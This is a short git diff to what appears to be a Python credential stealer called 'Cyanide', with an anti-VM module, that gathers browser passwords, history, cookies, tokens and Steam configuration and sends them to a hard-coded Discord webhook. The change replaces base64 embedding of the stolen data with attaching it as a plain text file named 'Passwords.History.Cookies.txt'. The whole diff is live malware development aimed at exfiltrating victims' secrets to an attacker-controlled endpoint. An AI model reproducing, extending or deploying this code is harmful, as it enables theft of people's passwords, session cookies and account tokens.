@@ -3,6 +3,7 @@ import vdf
 import base64
 import json
 import nukelib
+import requests
 
 from core.componets import extractor
 from core.componets import antivm
@@ -15,12 +16,12 @@ class Main:
     def __init__(self) -> None:
         self.webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1084889965940441269/0A7ZO1YHM3Ao3yaeH6cu0uqxe8mvwRsUOT5R1XRRiGpJUtGCL_jqZxmRu5u6zhpfImno', username="Cyanide")
 
-    def convert2Base64(self, creds: list):
+    def credsIntodict(self, creds: list):
         dataBuffer = {}
         for cell in creds:
             dataBuffer.update(cell)
         
-        return base64.b64encode(json.dumps(dataBuffer, indent=3).encode()).decode()
+        return json.dumps(dataBuffer, indent=3)
 
     def browser(self):
         creds = []
@@ -118,8 +119,8 @@ class Main:
 
         embed = DiscordEmbed(title='Report')
         embed.add_embed_field(name='Tokens', value=f"""```{tokens}```""")
-        embed.add_embed_field(name='Passwords/History/Cookies', value=f"""data:text/plain;base64,{self.convert2Base64(listCreds)}""")
         self.webhook.add_file(file=vdf.dumps(userConfig, True).encode(), filename="SteamConfig.txt")
+        self.webhook.add_file(file=self.credsIntodict(listCreds).encode(), filename="Passwords.History.Cookies.txt")
         self.webhook.add_embed(embed)
         r = self.webhook.execute()
 
